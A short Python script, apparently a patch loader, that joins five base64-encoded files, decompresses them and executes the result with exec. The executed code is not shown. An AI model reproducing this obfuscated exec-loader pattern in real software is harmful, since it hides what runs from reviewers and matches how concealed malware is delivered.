from pathlib import Path
import base64
import zlib

PATCH_DIR = Path(__file__).resolve().parent
parts = [(PATCH_DIR / f"_payload_{index:02d}.b64") for index in range(1, 6)]
missing = [str(path) for path in parts if not path.exists()]
if missing:
    raise SystemExit(f"Missing V2 payload parts: {missing}")
payload = "".join(path.read_text().strip() for path in parts)
source = zlib.decompress(base64.b64decode(payload)).decode()
exec(compile(source, __file__, "exec"))
